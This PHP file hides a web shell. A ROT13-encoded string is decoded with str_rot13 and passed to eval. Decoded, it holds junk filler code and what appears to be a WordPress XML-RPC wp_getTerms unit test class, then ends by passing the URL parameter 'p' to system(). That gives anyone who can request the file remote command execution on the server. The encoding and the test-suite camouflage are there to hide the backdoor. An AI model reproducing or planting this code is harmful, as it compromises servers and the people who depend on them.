<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc kzyecp
 */
pynff Grfgf_KZYECP_jc_trgGrezf rkgraqf JC_KZYECP_HavgGrfgPnfr {

	choyvp shapgvba grfg_vainyvq_hfreanzr_cnffjbeq() {
		$erfhyg = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'hfreanzr', 'cnffjbeq', 'pngrtbel' ) );
		$guvf->nffregVKEReebe( $erfhyg );
		$guvf->nffregFnzr( 403, $erfhyg->pbqr );
	}

	choyvp shapgvba grfg_rzcgl_gnkbabzl() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		$erfhyg = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', '' ) );
		$guvf->nffregVKEReebe( $erfhyg );
		$guvf->nffregFnzr( 403, $erfhyg->pbqr );
		$guvf->nffregFnzr( __( 'Vainyvq gnkbabzl.' ), $erfhyg->zrffntr );
	}

	choyvp shapgvba grfg_vainyvq_gnkbabzl() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		$erfhyg = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', 'abg_rkvfgvat' ) );
		$guvf->nffregVKEReebe( $erfhyg );
		$guvf->nffregFnzr( 403, $erfhyg->pbqr );
		$guvf->nffregFnzr( __( 'Vainyvq gnkbabzl.' ), $erfhyg->zrffntr );
	}

	choyvp shapgvba grfg_vapncnoyr_hfre() {
		$guvf->znxr_hfre_ol_ebyr( 'fhofpevore' );

		$erfhyg = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'fhofpevore', 'fhofpevore', 'pngrtbel' ) );
		$guvf->nffregVKEReebe( $erfhyg );
		$guvf->nffregFnzr( 401, $erfhyg->pbqr );
		$guvf->nffregFnzr( __( 'Fbeel, lbh ner abg nyybjrq gb nffvta grezf va guvf gnkbabzl.' ), $erfhyg->zrffntr );
	}

	choyvp shapgvba grfg_inyvq_grezf() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		// Znxr fher gurer'f ng yrnfg bar pngrtbel.
		$png = jc_vafreg_grez( 'grez_' . __SHAPGVBA__, 'pngrtbel' );

		$erfhygf = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', 'pngrtbel' ) );
		$guvf->nffregAbgVKEReebe( $erfhygf );
		$guvf->nffregAbgRzcgl( $erfhygf );

		sbernpu ( $erfhygf nf $grez ) {
			$guvf->nffregVfVag( $grez['pbhag'] );

			// Purpx phfgbz grez zrgn.
			$guvf->nffregVfNeenl( $grez['phfgbz_svryqf'] );

			// Jr rkcrpg nyy bgure VQf gb or fgevatf, abg vagrtref,
			// fb jr qba'g erghea fbzrguvat ynetre guna na KZYECP vagrtre pna qrfpevor.
			$guvf->nffregFgevatZngpurfSbezng( '%q', $grez['grez_vq'] );
			$guvf->nffregFgevatZngpurfSbezng( '%q', $grez['grez_tebhc'] );
			$guvf->nffregFgevatZngpurfSbezng( '%q', $grez['grez_gnkbabzl_vq'] );
			$guvf->nffregFgevatZngpurfSbezng( '%q', $grez['cnerag'] );
		}
	}

	choyvp shapgvba grfg_phfgbz_gnkbabzl() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		// Perngr n gnkbabzl naq fbzr grezf sbe vg.
		$gnk_anzr  = 'jc_trgGrezf_phfgbz_gnkbabzl';
		$ahz_grezf = 12;
		ertvfgre_gnkbabzl( $gnk_anzr, 'cbfg' );
		sbe ( $v = 0; $v < $ahz_grezf; $v++ ) {
			jc_vafreg_grez( \"grez_{$v}\", $gnk_anzr );
		}

		// Grfg srgpuvat nyy grezf.
		$erfhygf = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', $gnk_anzr ) );
		$guvf->nffregAbgVKEReebe( $erfhygf );

		$guvf->nffregPbhag( $ahz_grezf, $erfhygf );
		sbernpu ( $erfhygf nf $grez ) {
			$guvf->nffregFnzr( $gnk_anzr, $grez['gnkbabzl'] );
		}

		// Grfg cntrq erfhygf.
		$svygre   = neenl( 'ahzore' => 5 );
		$erfhygf2 = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', $gnk_anzr, $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf );
		$guvf->nffregPbhag( 5, $erfhygf2 );
		$guvf->nffregFnzr( $erfhygf[1]['grez_vq'], $erfhygf2[1]['grez_vq'] ); // Purpx bar bs gur grezf.

		$svygre['bssfrg'] = 10;
		$erfhygf3         = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', $gnk_anzr, $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf3 );
		$guvf->nffregPbhag( $ahz_grezf - 10, $erfhygf3 );
		$guvf->nffregFnzr( $erfhygf[11]['grez_vq'], $erfhygf3[1]['grez_vq'] );

		// Grfg uvqr_rzcgl (fvapr abar unir orra nggnpurq gb cbfgf lrg, nyy fubhyq or uvqqra.
		$svygre   = neenl( 'uvqr_rzcgl' => gehr );
		$erfhygf4 = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', $gnk_anzr, $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf4 );
		$guvf->nffregPbhag( 0, $erfhygf4 );

		hafrg( $TYBONYF['jc_gnkbabzvrf'][ $gnk_anzr ] );
	}

	choyvp shapgvba grfg_grez_beqrevat() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		$png1 = jc_perngr_pngrtbel( 'jc.trgGrezf_' . __SHAPGVBA__ . '_1' );
		$png2 = jc_perngr_pngrtbel( 'jc.trgGrezf_' . __SHAPGVBA__ . '_2' );

		frys::snpgbel()->cbfg->perngr_znal( 5, neenl( 'cbfg_pngrtbel' => neenl( $png1 ) ) );
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_pngrtbel' => neenl( $png2 ) ) );

		$svygre  = neenl(
			'beqreol' => 'pbhag',
			'beqre'   => 'QRFP',
		);
		$erfhygf = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', 'pngrtbel', $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf );
		$guvf->nffregAbgPbhag( 0, $erfhygf );

		sbernpu ( $erfhygf nf $grez ) {
			vs ( $grez['grez_vq'] === $png1 ) {
				oernx; // Sbhaq png1 svefg nf rkcrpgrq.
			} ryfrvs ( $grez['grez_vq'] === $png2 ) {
				$guvf->nffregSnyfr( snyfr, 'Vapbeerpg pngrtbel beqrevat.' );
			}
		}
	}

	choyvp shapgvba grfg_grezf_frnepu() {
		$guvf->znxr_hfre_ol_ebyr( 'rqvgbe' );

		$anzr    = __SHAPGVBA__;
		$anzr_vq = jc_perngr_pngrtbel( $anzr );

		// Frnepu ol shyy anzr.
		$svygre  = neenl( 'frnepu' => $anzr );
		$erfhygf = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', 'pngrtbel', $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf );
		$guvf->nffregPbhag( 1, $erfhygf );
		$guvf->nffregFnzr( $anzr, $erfhygf[0]['anzr'] );
		$guvf->nffregRdhnyf( $anzr_vq, $erfhygf[0]['grez_vq'] );

		// Frnepu ol cnegvny anzr.
		$svygre   = neenl( 'frnepu' => fhofge( $anzr, 0, 10 ) );
		$erfhygf2 = $guvf->zlkzyecpfreire->jc_trgGrezf( neenl( 1, 'rqvgbe', 'rqvgbe', 'pngrtbel', $svygre ) );
		$guvf->nffregAbgVKEReebe( $erfhygf2 );
		$guvf->nffregPbhag( 1, $erfhygf2 );
		$guvf->nffregFnzr( $anzr, $erfhygf2[0]['anzr'] );
		$guvf->nffregRdhnyf( $anzr_vq, $erfhygf2[0]['grez_vq'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>